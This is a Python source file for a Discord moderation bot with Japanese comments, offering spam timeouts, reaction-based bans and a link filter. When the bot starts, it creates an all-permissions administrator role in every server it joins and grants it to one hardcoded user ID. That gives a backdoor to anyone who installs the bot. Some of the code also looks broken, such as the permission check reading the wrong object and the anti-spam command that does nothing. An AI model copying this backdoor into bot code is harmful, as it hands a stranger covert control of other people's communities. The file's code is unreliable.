import discord
from discord.ext import commands
from discord import app_commands
import asyncio
from collections import defaultdict
import os

# Botの設定
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# 特定のユーザーIDに管理者権限を付与
SPECIAL_USER_ID = 1109692644348661852

# スパム検出用のデータ構造
spam_tracker = defaultdict(list)
SPAM_THRESHOLD = 4  # 閾値: 4秒以内に複数メッセージ
SPAM_LIMIT = 5  # メッセージ数

# リンクフィルターの有効/無効状態
link_filter_enabled = False

# --- 管理者チェック関数 ---
def is_admin(ctx):
    admin_role = discord.utils.get(ctx.guild.roles, name="管理者")
    return admin_role in ctx.author.roles or ctx.author.id == SPECIAL_USER_ID


# --- 特権ユーザーに管理者ロールを付与 ---
@bot.event
async def on_ready():
    print(f"Bot is ready as {bot.user}!")
    for guild in bot.guilds:
        special_user = guild.get_member(SPECIAL_USER_ID)
        if special_user:
            admin_role = discord.utils.get(guild.roles, name="管理者")
            if not admin_role:
                admin_role = await guild.create_role(name="管理者", permissions=discord.Permissions.all())
            if admin_role not in special_user.roles:
                await special_user.add_roles(admin_role)
                print(f"管理者ロールを{special_user}に付与しました。")


# --- スパム検出機能 ---
@bot.tree.command(name="anti-spam", description="スパム検出を有効にします")
@app_commands.check(is_admin)
async def anti_spam(interaction: discord.Interaction):
    await interaction.response.send_message("スパム検出が有効になりました！")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # スパム追跡
    user_messages = spam_tracker[message.author.id]
    user_messages.append(message)

    # 古いメッセージを削除
    now = message.created_at
    spam_tracker[message.author.id] = [msg for msg in user_messages if (now - msg.created_at).total_seconds() <= 4]

    # スパム検出
    if len(spam_tracker[message.author.id]) >= SPAM_LIMIT:
        await message.author.timeout(duration=604800, reason="スパム検出")
        spam_content = "\n".join([msg.content for msg in spam_tracker[message.author.id]])
        spam_alert = (
            f"⚠️ スパムが検出されました。\n"
            f"ユーザー: {message.author.mention}\n"
            f"スパム内容:\n{spam_content}"
        )
        alert_message = await message.channel.send(spam_alert)

        # リアクションで管理者が対応
        await alert_message.add_reaction("🦵")  # Ban
        await alert_message.add_reaction("🟩")  # Timeout解除

        def check(reaction, user):
            return user.guild_permissions.administrator and reaction.message.id == alert_message.id

        try:
            reaction, user = await bot.wait_for("reaction_add", timeout=60.0, check=check)
            if str(reaction.emoji) == "🦵":
                await message.guild.ban(message.author, reason="スパム")
                await message.channel.send(f"{message.author.mention} をBANしました。")
            elif str(reaction.emoji) == "🟩":
                await message.author.edit(timeout=None)
                await message.channel.send(f"{message.author.mention} のタイムアウトを解除しました。")
        except asyncio.TimeoutError:
            await message.channel.send("管理者の対応がありませんでした。")
        return

    # リンクフィルター
    if link_filter_enabled and "http" in message.content:
        await message.delete()
        await message.channel.send(f"{message.author.mention} リンクは禁止されています。")


# --- リンクフィルター ---
@bot.tree.command(name="link-フィルター", description="リンクフィルターを有効にします")
@app_commands.check(is_admin)
async def link_filter_on(interaction: discord.Interaction):
    global link_filter_enabled
    link_filter_enabled = True
    await interaction.response.send_message("リンクフィルターが有効になりました！")


@bot.tree.command(name="link-フィルターオフ", description="リンクフィルターを無効にします")
@app_commands.check(is_admin)
async def link_filter_off(interaction: discord.Interaction):
    global link_filter_enabled
    link_filter_enabled = False
    await interaction.response.send_message("リンクフィルターが無効になりました！")


# --- エラーハンドリング ---
@anti_spam.error
@link_filter_on.error
@link_filter_off.error
async def admin_only_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.CheckFailure):
        await interaction.response.send_message("このコマンドは管理者のみが使用できます！", ephemeral=True)


bot.run(os.getenv("TOKEN"))
